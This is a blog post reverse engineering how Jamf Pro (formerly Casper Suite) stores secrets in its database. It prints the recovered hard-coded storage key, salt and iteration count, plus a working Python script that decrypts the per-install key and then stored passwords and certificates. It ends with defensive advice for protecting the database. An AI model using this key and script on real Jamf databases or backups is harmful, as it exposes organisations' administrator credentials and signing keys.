[screenshot_01]: /assets/img/casper/screenshot_01.png "Jamf Pro"
[screenshot_02]: /assets/img/casper/screenshot_02.png "New Management Account"
[screenshot_03]: /assets/img/casper/screenshot_03.png "readKeyFromDatabase"
[screenshot_04]: /assets/img/casper/screenshot_04.png "Decrypted fields"

---

# == DISCLAIMER ==

I wrote this blog years ago (2019) using a Jamf Pro version that probably isn't even supported anymore. I have no clue what the current version is or if what is written here even applies anymore. I'm only publishing this in the interest of knowledge sharing 😄.

This is by no means a vulnerability, it's just the nature of encrypting things. Somewhere, somehow, it needs to be decrypted to be useful. For example:

- [Reverse engineering and decrypting CyberArk vault credential files](https://jellevergeer.com/reverse-engineering-and-decrypting-cyberark-vault-credential-files/)
- [Thick Client Penetration Testing – Part 4](https://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/)

Enjoy!

---

# Casper the password ghost

## Decrypting Jamf Pro / Casper Suite storage

### Intro

Most organisations use some sort of central management tool to manage and maintain their systems. For Microsoft Windows environments, this is mostly done using tools like System Center Configuration Manager (SCCM), System Center Operations Manager (SCOM), Intune, etcetera. These products will likely ring a bell with most people working somewhere in the magical space that is IT.

But what if you're infrastructure consists of mostly Apple systems? While there are a multitude of solutions available for managing Apple systems, one of the largest names in this space is Jamf. Their signature product [Jamf Pro](https://www.jamf.com/products/jamf-pro/ "Jamf Pro"), formerly known as Casper Suite, is one of the best known products offering a central dashboard for managing and maintaining Apple based systems.

### Security

A central dashboard is awesome for administrators because it offers them a one-stop shop for all their administrative needs. The same holds true for attackers though, as these types of products usually contain truckloads of juicy info such as:

- Usernames and passwords;
- Corporate software signing certificates and matching private keys;
- Device encryption keys;
- Settings for external connections such as LDAP and SMTP;
- Etcetera.

Obviously this information isn't stored in plain-text. Jamf even offer a detailed [security](https://www.jamf.com/security/) page on their website, explaining all the measures they are taking to ensure all information is safe. When it comes to storing sensitive information in the database, they have this to say:

> "[...] data at rest uses industry standard AES-256 to encrypt fields in the database that contain sensitive information, such as passwords and FileVault individual recovery keys. [...] all other passwords are encrypted using industry standard AES-256 with a unique, random key for each database."

Sounds good. This should mean there are no hardcoded or default encryption keys in use, and that every instance of the software uses unique keys. In other words, customer A cannot decrypt the database of customer B. Let's put this to the test.

### Validating the claims

Installing Jamf Pro is simple enough. It is a Java application that runs on a Tomcat server and uses MySQL as it's database backend. Let's install Jamf Pro and see what happens.

![Jamf Pro][screenshot_01]

Cool, that works. Let's insert some test data and see if we can find it in the database. We'll create a new policy that adds a so-called **`Management Account`** to all systems. We'll give ths new account the password **`IWantT0Beli3v3!`**.

![New Management Account][screenshot_02]

After some digging in the database, it turns out that the password is stored in the **`Policies`** table under the **`managed_password_encrypted`** column.

```sql
mysql> SELECT name,managed_password_encrypted FROM policies;
+-----------------------------+----------------------------+
| name                        | managed_password_encrypted |
+-----------------------------+----------------------------+
| Update Inventory            |                            |
| Default management accounts | Au/IuzGbOQ7oaRMTGNWYqA==   |
+-----------------------------+----------------------------+
2 rows in set (0.00 sec)

mysql>
```

Nice, that seems to be it. Base64 decoding it doesn't really yield anything useful. But seeing as how it's supposed to be encrypted, this makes sense.

```bash
pentest@cortana:~$ echo Au/IuzGbOQ7oaRMTGNWYqA== | base64 -d | hd
00000000  02 ef c8 bb 31 9b 39 0e  e8 69 13 13 18 d5 98 a8  |....1.9..i......|
00000010
pentest@cortana:~$
```

No worries, we do seem to have a lead. All encrypted values in the database have column names ending in **`_encrypted`**. Let's open up the Jamf Pro .war file in a Java decompiler. In our case, JD-GUI. It seems that all the juicy stuff is going on in **`com.jamfsoftware.jss.utils.PasswordServiceImpl.class`**

![readKeyFromDatabase][screenshot_03]

Here we find two funcions called **`readKeyFromDatabase`** and **`readEncryptionTypeFromDatabase`**. Let's see what they do.

```java
public static boolean readKeyFromDatabase()
{
  boolean foundKey = false;
  PreparedStatement ps = null;
  ResultSet rs = null;
  try
  {
    String STATEMENT = "SELECT * FROM encryption_key LIMIT 1";
    ps = DataSource.prepareStatementForExecuteQuery(STATEMENT);
    rs = DataSource.executeQuery(ps);
    while (rs.next())
    {
      try
      {
        setEncryptionAlgorithm(PasswordServiceImpl.EncryptionAlgorithm.fromDbType(rs.getInt("encryption_type")));
      }
      catch (Exception e)
      {
        setEncryptionAlgorithm(PasswordServiceImpl.EncryptionAlgorithm.DES);
      }
      PasswordServiceImpl.Encrypter keyEncryptor = new PasswordServiceImpl.Encrypter(getStorageKey(), getEncryptionAlgorithm());
      setEncryptionKey(keyEncryptor.decrypt(rs.getString("encryption_key")), getEncryptionAlgorithm());

      foundKey = true;
    }
  }
  catch (SQLException e)
  {
    if (DatabaseConnectorHelper.isSqlSyntaxErrorException(e))
    {
      jamfLog.debug("Key table does not exist, defaulting to previous algorithm.");
      setEncryptionAlgorithm(PasswordServiceImpl.EncryptionAlgorithm.DES);
      setEncryptionKey(getLegacyEncryptionKey(), getEncryptionAlgorithm());
    }
    else
    {
      jamfLog.error("Reading key", e);
    }
  }
  catch (Exception e)
  {
    jamfLog.error("Reading key", e);
  }
  finally
  {
    DataSource.closeResultSet(ps, rs);
  }
  return foundKey;
}

public static PasswordServiceImpl.EncryptionAlgorithm readEncryptionTypeFromDatabase()
{
  PasswordServiceImpl.EncryptionAlgorithm currentType = null;
  PreparedStatement ps = null;
  ResultSet rs = null;
  try
  {
    String STATEMENT = "SELECT encryption_type FROM encryption_key LIMIT 1";
    ps = DataSource.prepareStatementForExecuteQuery(STATEMENT);
    rs = DataSource.executeQuery(ps);
    while (rs.next()) {
      currentType = PasswordServiceImpl.EncryptionAlgorithm.fromDbType(rs.getInt("encryption_type"));
    }
  }
  catch (Exception e)
  {
    jamfLog.error("Reading type", e);
  }
  finally
  {
    DataSource.closeResultSet(ps, rs);
  }
  return currentType;
}
```

Alright, long story short, the encryption key seems to be stored in the database. Let's see what happens when we run the query from the **`readKeyFromDatabase`** function.

```sql
mysql> SELECT * FROM encryption_key LIMIT 1;
+------------------------------------------------------------------------------------------+-----------------+
| encryption_key                                                                           | encryption_type |
+------------------------------------------------------------------------------------------+-----------------+
| E0px0HwYQkhCCSxPYH2L+PlHjBNl8SG+6HaiRhhkEWe3XGb16tI5LDUGPpRDKuKtbxGz4xu/1anStV+EQS4h/Q== |               1 |
+------------------------------------------------------------------------------------------+-----------------+
1 row in set (0.00 sec)

mysql>
```

Right. That is apparently our key, and the algorithm is **`1`**, whatever that may mean. Let's dig a bit deeper. There also seems to be a function called **`updateEncryptionKey`**. This surely has to have some info to help us out. And sure enough, this function inserts a new encryption key into the database, but it also seems to encrypt the encryption key. Hmm, encryption key inception?

```java
if (writeToDatabase) {
    try
    {
        PasswordServiceImpl.Encrypter keyEncryptor = new PasswordServiceImpl.Encrypter(getStorageKey(), newAlgorithm);
        String STATEMENT_INSERT = "INSERT INTO encryption_key (encryption_key,encryption_type) VALUES (?,?)";
        ps = DataSource.prepareStatementForExecute(STATEMENT_INSERT);
        ps.setString(1, keyEncryptor.encrypt(encryptionKey));
        ps.setInt(2, newAlgorithm.getDbType());
        DataSource.execute(ps);
    }
    catch (Exception e)
    {
        jamfLog.error("Inserting key", e);
    }
    finally
    {
        DataSource.closeStatement(ps);
    }
}
```

Take a look at the second line, where the **`keyEncryptor`** object is created. It's parameters seem to be something along the lines of **`encryption key, encryption alorithm`**. This function is used to encrypt our encryption key later on in the function. So what is the encryption key used for that? It seems this is returned from a function called **`getStorageKey`**. Let's check it out.

```java
private static String getStorageKey()  {
  String allCharacters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}|;':,.<>?";
  StringBuffer t = new StringBuffer();
  t.append(allCharacters.charAt(53));
  t.append(allCharacters.charAt(38));
  t.append(allCharacters.charAt(64));
  t.append(allCharacters.charAt(59));
  t.append(allCharacters.charAt(55));
  t.append(allCharacters.charAt(72));
  t.append(allCharacters.charAt(87));
  t.append(allCharacters.charAt(71));
  t.append(allCharacters.charAt(24));
  t.append(allCharacters.charAt(67));
  t.append(allCharacters.charAt(66));
  t.append(allCharacters.charAt(53));
  t.append(allCharacters.charAt(10));
  t.append(allCharacters.charAt(32));
  t.append(allCharacters.charAt(12));
  t.append(allCharacters.charAt(39));
  t.append(allCharacters.charAt(60));
  t.append(allCharacters.charAt(58));
  t.append(allCharacters.charAt(51));
  t.append(allCharacters.charAt(37));

  t.append(allCharacters.charAt(5));
  t.append(allCharacters.charAt(7));
  t.append(allCharacters.charAt(1));
  t.append(allCharacters.charAt(37));
  t.append(allCharacters.charAt(80));
  t.append(allCharacters.charAt(72));
  t.append(allCharacters.charAt(38));
  t.append(allCharacters.charAt(83));
  t.append(allCharacters.charAt(9));
  t.append(allCharacters.charAt(88));

  return t.toString();
}
```

Neat, that looks an awful lot like a hard coded key. Let's move that function to it's own Java file and replace **`return`** with **`System.out.println`**.

```java
public class getStorageKey {
    public static void main(String[] args) {
        String allCharacters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}|;':,.<>?";
        StringBuffer t = new StringBuffer();
        t.append(allCharacters.charAt(53));
        t.append(allCharacters.charAt(38));
        t.append(allCharacters.charAt(64));
        t.append(allCharacters.charAt(59));
        t.append(allCharacters.charAt(55));
        t.append(allCharacters.charAt(72));
        t.append(allCharacters.charAt(87));
        t.append(allCharacters.charAt(71));
        t.append(allCharacters.charAt(24));
        t.append(allCharacters.charAt(67));
        t.append(allCharacters.charAt(66));
        t.append(allCharacters.charAt(53));
        t.append(allCharacters.charAt(10));
        t.append(allCharacters.charAt(32));
        t.append(allCharacters.charAt(12));
        t.append(allCharacters.charAt(39));
        t.append(allCharacters.charAt(60));
        t.append(allCharacters.charAt(58));
        t.append(allCharacters.charAt(51));
        t.append(allCharacters.charAt(37));

        t.append(allCharacters.charAt(5));
        t.append(allCharacters.charAt(7));
        t.append(allCharacters.charAt(1));
        t.append(allCharacters.charAt(37));
        t.append(allCharacters.charAt(80));
        t.append(allCharacters.charAt(72));
        t.append(allCharacters.charAt(38));
        t.append(allCharacters.charAt(83));
        t.append(allCharacters.charAt(9));
        t.append(allCharacters.charAt(88));
        System.out.println(t.toString());
    }
}
```

Let's compile and execute to see what happens.

```
pentest@cortana:~$ javac getStorageKey.java
pentest@cortana:~$ java getStorageKey
2M#84->)y^%2kGmN97ZLfhbL|-M:j?
pentest@cortana:~$
```

Nice, that seems like something that could be a valid encryption key. Let's figure out the algorithm used.

Turns out theres a function called **`fromDbType`** that will return the algorithm used.

```java
public static EncryptionAlgorithm fromDbType(int dbType)
    {
      if (dbType == 1) {
        return AES256;
      }
      if (dbType == 2) {
        return DES;
      }
      return DES;
    }
  }
```

Our encryption type was **`1`**, so that translates to **`AES256`**. Good to know. Unfortunatly, it's not a plain and simple AES-256 implementation, as the **`Encrypter`** class shows. There's a salt, an iteration count and all sorts of magic.

```java
  protected static class Encrypter
  {
    Cipher ecipher;
    Cipher dcipher;
    byte[] salt = { -87, -101, -56, 50, 86, 53, -29, 3 };
    int iterationCount = 19;
    private SecretKey key = null;
    private AlgorithmParameterSpec paramSpec = null;

    Encrypter(String passPhrase, PasswordServiceImpl.EncryptionAlgorithm alg)
    {
      try
      {
        SecurityUtils.getBouncyCastleProvider();

        KeySpec keySpec = new PBEKeySpec(passPhrase.toCharArray(), this.salt, this.iterationCount);
        SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(alg.getAlgorithm(), SecurityUtils.getBouncyCastleProvider());
        this.key = secretKeyFactory.generateSecret(keySpec);

        this.ecipher = Cipher.getInstance(this.key.getAlgorithm(), SecurityUtils.getBouncyCastleProvider());
        this.dcipher = Cipher.getInstance(this.key.getAlgorithm(), SecurityUtils.getBouncyCastleProvider());

        this.paramSpec = new PBEParameterSpec(this.salt, this.iterationCount);

        initEncrypt();
        initDecrypt();
      }
      catch (InvalidKeySpecException e)
      {
        PasswordServiceImpl.jamfLog.error("java.security.spec.InvalidKeySpecException generating encrypter", e);
      }
      catch (NoSuchAlgorithmException e)
      {
        PasswordServiceImpl.jamfLog.error("java.security.NoSuchAlgorithmException generating encrypter", e);
      }
      catch (NoSuchPaddingException e)
      {
        PasswordServiceImpl.jamfLog.error("java.security.NoSuchPaddingException generating encrypter", e);
      }
    }
```

I'll save you the trouble of having to comb through the code. Turns out it's using something called **`PBEWITHSHA256AND256BITAES-CBC-BC`**. I'd never heard of it either, but seems someone created a very handy [python implementation](https://gist.github.com/bertramn/d22e88eba2ce432be016ab5d61595ab4 "Jasypt/Bouncycastle PBEWITHSHA256AND256BITAES-CBC-BC en/decryption in Python
"). It does need some small modifications to fit our needs, but that's no big deal. We do need some information though:

- The salt
- The iteration count

The iteration count is easy, that's been defined in the Encrypter class:

```java
int iterationCount = 19;
```

The salt is in there as well, but not in a format that python can easily work with:

```java
byte[] salt = { -87, -101, -56, 50, 86, 53, -29, 3 };
```

So, let's create a small Java program to convert the salt to hexadecimal values.

```java
 public class getSalt {
    public static void main(String[] args) {
        byte[] salt = { -87, -101, -56, 50, 86, 53, -29, 3 };
        StringBuilder sb = new StringBuilder();

        for (byte b : salt) {
            sb.append(String.format("%02X ", b));
        }

        System.out.println(sb.toString());
    }
}
```

Let's see if it works.

```shell
pentest@cortana:~$ javac getSalt.java
pentest@cortana:~$ java getSalt
A9 9B C8 32 56 35 E3 03
pentest@cortana:~$
```

Awesome. Both values seem to be hardcoded in the software, so we might as well hardcode them into the python script. We also change the **`SALT_SIZE_BYTE`** parameter van 16 to 8, as we have an 8 byte salt to work with. The **`passcode`** is our hard-coded storage key and the encrypted encryption key is the value we want to decrypt. The final script looks something like this:

```python
from __future__ import (absolute_import, division, print_function)

from abc import ABCMeta
from array import array
from base64 import b64encode, b64decode
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


class PBEParameterGenerator(object):
    __metaclass__ = ABCMeta

    @staticmethod
    def pad(block_size, s):
        """
        Pad a string to the provided block size when using fixed block ciphers.

        :param block_size: int - the cipher block size
        :param s: str - the string to pad
        :return: a padded string that can be fed to the cipher
        """
        return s + (block_size - len(s) % block_size) * chr(block_size - len(s) % block_size)

    @staticmethod
    def unpad(s):
        """
        Remove padding from the string after decryption when using fixed block ciphers.

        :param s: str - the string to remove padding from
        :return: the unpadded string
        """
        return s[0:-ord(s[-1])]

    @staticmethod
    def adjust(a, a_off, b):
        """
        Adjusts the byte array as per PKCS12 spec

        :param a: byte[] - the target array
        :param a_off: int - offset to operate on
        :param b: byte[] - the bitsy array to pick from
        :return: nothing as operating on array by reference
        """
        x = (b[len(b) - 1] & 0xff) + (a[a_off + len(b) - 1] & 0xff) + 1

        a[a_off + len(b) - 1] = x & 0xff

        x = x >> 8

        for i in range(len(b) - 2, -1, -1):
            x = x + (b[i] & 0xff) + (a[a_off + i] & 0xff)
            a[a_off + i] = x & 0xff
            x = x >> 8

    @staticmethod
    def pkcs12_password_to_bytes(password):
        """
        Converts a password string to a PKCS12 v1.0 compliant byte array.

        :param password: byte[] - the password as simple string
        :return: The unsigned byte array holding the password
        """
        pkcs12_pwd = [0x00] * (len(password) + 1) * 2

        for i in range(0, len(password)):
            digit = ord(password[i])
            pkcs12_pwd[i * 2] = int(digit >> 8)
            pkcs12_pwd[i * 2 + 1] = int(digit)
        x = array('B', pkcs12_pwd)

        return array('B', pkcs12_pwd)


class PKCS12ParameterGenerator(PBEParameterGenerator):
    """
    Equivalent of the Bouncycastle PKCS12ParameterGenerator.
    """
    __metaclass__ = ABCMeta

    KEY_MATERIAL = 1
    IV_MATERIAL = 2
    MAC_MATERIAL = 3

    SALT_SIZE_BYTE = 8

    def __init__(self, digest_factory):
        super(PBEParameterGenerator, self).__init__()
        self.digest_factory = digest_factory

    def generate_derived_parameters(self, password, salt, iterations, key_size, iv_size):
        """
        Generates the key and iv that can be used with the cipher.

        :param password: str - the password used for the key material
        :param salt: byte[] - random salt
        :param iterations: int - number if hash iterations for key material
        :param key_size: int - key size in bits
        :param iv_size: int - iv size in bits
        :return: key and iv that can be used to setup the cipher
        """
        key_size = int(key_size / 8)
        iv_size = int(iv_size / 8)

        # pkcs12 padded password (unicode byte array with 2 trailing 0x0 bytes)
        password_bytes = PKCS12ParameterGenerator.pkcs12_password_to_bytes(password)

        d_key = self.generate_derived_key(password_bytes, salt, iterations, self.KEY_MATERIAL, key_size)
        if iv_size and iv_size > 0:
            d_iv = self.generate_derived_key(password_bytes, salt, iterations, self.IV_MATERIAL, iv_size)
        else:
            d_iv = None
        return d_key, d_iv

    def generate_derived_key(self, password, salt, iterations, id_byte, key_size):
        """
        Generate a derived key as per PKCS12 v1.0 spec

        :param password: byte[] - pkcs12 padded password (unicode byte array with 2 trailing 0x0 bytes)
        :param salt: byte[] - random salt
        :param iterations: int - number if hash iterations for key material
        :param id_byte: int - the material padding
        :param key_size: int - the key size in bytes (e.g. AES is 256/8 = 32, IV is 128/8 = 16)
        :return: the sha256 digested pkcs12 key
        """

        u = int(self.digest_factory.digest_size)
        v = int(self.digest_factory.block_size)

        d_key = [0x00] * key_size

        # Step 1
        D = [id_byte] * v

        # Step 2
        S = []
        if salt and len(salt) != 0:
            s_size = v * int((len(salt) + v - 1) / v)
            S = [0x00] * s_size

            salt_size = len(salt)
            for i in range(s_size):
                S[i] = salt[i % salt_size]

        # Step 3
        P = []
        if password and len(password) != 0:
            p_size = v * int((len(password) + v - 1) / v)
            P = [0x00] * p_size

            password_size = len(password)
            for i in range(p_size):
                P[i] = password[i % password_size]

        # Step 4
        I = array('B', S + P)
        B = array('B', [0x00] * v)

        # Step 5
        c = int((key_size + u - 1) / u)

        # Step 6
        for i in range(1, c + 1):
            # Step 6 - a
            digest = self.digest_factory.new()
            digest.update(array('B', D))
            digest.update(I)
            A = array('B', digest.digest())  # bouncycastle now resets the digest, we will create a new digest

            for j in range(1, iterations):
                A = array('B', self.digest_factory.new(A).digest())

                # Step 6 - b
            for k in range(0, v):
                B[k] = A[k % u]

            # Step 6 - c
            for j in range(0, int(len(I) / v)):
                self.adjust(I, j * v, B)

            if i == c:
                for j in range(0, key_size - ((i - 1) * u)):
                    d_key[(i - 1) * u + j] = A[j]
            else:
                for j in range(0, u):
                    d_key[(i - 1) * u + j] = A[j]

        return array('B', d_key)

def get_params(passphrase, salt, iterations=19, key_len=256, iv_len=128):
    pass

def decrypt(password, ciphertext, iterations=19):
    # some default from somewhere
    key_size_bits = 256
    iv_size_bits = 128

    # create sha256 PKCS12 secret generator
    generator = PKCS12ParameterGenerator(SHA256)

    # decode the base64 encoded and encrypted secret
    n_cipher_bytes = b64decode(ciphertext)

    # extract salt bytes 0 - SALT_SIZE
    #salt = array('B', n_cipher_bytes[:PKCS12ParameterGenerator.SALT_SIZE_BYTE])
    salt = array('B', 'A99BC8325635E303'.decode('hex'))
    # print('dec-salt = %s' % binascii.hexlify(salt))

    # create reverse key material
    key, iv = generator.generate_derived_parameters(password, salt, iterations, key_size_bits, iv_size_bits)

    cipher = AES.new(key, AES.MODE_CBC, iv)

    # extract encrypted message bytes SALT_SIZE - len(cipher)
    #n_cipher_message = array('B', n_cipher_bytes[PKCS12ParameterGenerator.SALT_SIZE_BYTE:])
    n_cipher_message = array('B', n_cipher_bytes)

    # decode the message and unpad
    decoded = cipher.decrypt(n_cipher_message.tostring())

    return generator.unpad(decoded)


if __name__ == "__main__":
    passcode = '2M#84->)y^%2kGmN97ZLfhbL|-M:j?'
    #result = encrypt(passcode, 'secret value', 19)

    #print('enc = %s' % result)

    ciphertext = 'E0px0HwYQkhCCSxPYH2L+PlHjBNl8SG+6HaiRhhkEWe3XGb16tI5LDUGPpRDKuKtbxGz4xu/1anStV+EQS4h/Q=='
    reverse = decrypt(passcode, ciphertext, 19)

    print('[+] Decrypted: %s' % reverse)

    # run something like this on the jasypt command line
    # $JASYPT_HOME/bin/decrypt.sh keyObtentionIterations = 4000 \
    #                             providerClassName = "org.bouncycastle.jce.provider.BouncyCastleProvider" \
    #                             saltGeneratorClassName = "org.jasypt.salt.RandomSaltGenerator" \
    #                             algorithm = "PBEWITHSHA256AND256BITAES-CBC-BC" \
    #                             password = 'pssst...don\'t tell anyone' \
    #                             input = 'xgX5+yRbKhs4zSubkAPkg9gSBkZU6XWt7csceM/3xDY='
```

It's not pretty, but does it work? Let's find out.

```shell
pentest@cortana:~$ python jamf_decrypt.py
[+] Decrypted: 36e5m6jodegrkdmmsq4mrt2orf35ktmq0j54o33ej76m3rgd77s
pentest@cortana:~$
```

Hmm, at least it's all readable ASCII characters now. What if we use that value as the **`passcode`** and try to decrypt our encrypted password?

```python
if __name__ == "__main__":
    passcode = '36e5m6jodegrkdmmsq4mrt2orf35ktmq0j54o33ej76m3rgd77s'
    #result = encrypt(passcode, 'secret value', 19)

    #print('enc = %s' % result)

    ciphertext = 'Au/IuzGbOQ7oaRMTGNWYqA=='
    reverse = decrypt(passcode, ciphertext, 19)

    print('[+] Decrypted: %s' % reverse)
```

Here goes nothing.

```shell
pentest@cortana:~$ python jamf_decrypt.py
[+] Decrypted: IWantT0Beli3v3!
pentest@cortana:~$
```

Woo! Success! We can now decrypt every encrypted value in the Jamf database! Turns out that the product indeed uses a different encryption key for every install, but it encrypts that key with a hard-coded second encryption key. This key is shared between installs and at least versions 9 and 10, but possibly more!

This means that anyone with read access to a Jamf database or database backup is able to decrypt all data stored in the database.

### Automating

Obviously we don't really want to decrypt every value by hand, so I wrote a small script that automatically connects to a database, decrypts all encrypted values and outputs them to a more readable HTML format, stolen shamelessly from [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump "ldapdomaindump").

```shell
pentest@cortana:~$ python jamf_decrypt.py
[-] Connecting to database
[+] Connected to database "jamf"
[-] Getting session key
[+] Got session key "36e5m6jodegrkdmmsq4mrt2orf35ktmq0j54o33ej76m3rgd77s"
[-] Found encrypted data in table "certificate_authority_settings", decrypting..
[-] Found encrypted data in table "enrollment_settings", decrypting..
[-] Found encrypted data in table "policies", decrypting..
[-] Found encrypted data in table "signing_certificates", decrypting..
pentest@cortana:~$
```

![Decrypted fields][screenshot_04]

The code for this tool and the examples used in this post can be found [here](https://github.com/dmaasland/jamf_decrypt "Jamf decrypt on Github").

### Conclusion

While this does look like a very serious issue, in reality there is no real way around this. At some point the software will have to decrypt the encrypted content in order to use it. It's a matter of how much time and energy an attacker is willing to spend on figuring out how the encryption works.

That being said, there are some things you can do to better protect your Jamf Pro database, for example:

- Monitor access to the database
- Protect the database with a strong and unique password
- Make sure to also protect any database backups you may have
- Make sure the database is only reachable from the Jamf Webserver
- Avoid storing sensitive data in the Jamf database where possible

This post is not meant to scare people into not using Jamf Pro or to scold Jamf, it is simply an example of how cental management platforms can be abused by attackers. Using a central management platform is probably still a lot safer than manually managing each system.
